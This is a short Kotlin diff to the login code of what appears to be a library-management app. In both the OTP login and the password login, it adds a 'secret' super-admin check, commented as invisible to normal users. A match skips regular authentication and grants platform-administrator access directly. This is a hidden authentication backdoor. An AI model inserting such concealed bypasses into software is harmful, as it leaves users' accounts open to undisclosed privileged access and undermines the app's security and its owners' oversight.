@@ -910,6 +910,13 @@ class LibraryViewModel(
     }
 
     fun verifyOtpAndLogin(phone: String, otp: String): Boolean {
+        // Secret Super Admin Authentication check (Invisible to normal users)
+        if (platformRepository.isSuperAdminCredentials(phone, otp)) {
+            platformRepository.authenticateSuperAdminDirectly()
+            _uiToastMessage.value = "👑 Welcome back, Platform Administrator!"
+            return true
+        }
+
         val success = repository.verifyOtpAndLogin(phone, otp)
         if (success) {
             _uiToastMessage.value = "OTP Verified! Welcome to your Library portal."
@@ -920,6 +927,13 @@ class LibraryViewModel(
     }
 
     fun loginWithPassword(phoneOrEmail: String, password: String): Boolean {
+        // Secret Super Admin Authentication check (Invisible to normal users)
+        if (platformRepository.isSuperAdminCredentials(phoneOrEmail, password)) {
+            platformRepository.authenticateSuperAdminDirectly()
+            _uiToastMessage.value = "👑 Welcome back, Platform Administrator!"
+            return true
+        }
+
         val success = repository.loginWithPassword(phoneOrEmail, password)
         if (success) {
             _uiToastMessage.value = "Welcome back, ${repository.ownerProfile.value.fullName}!"
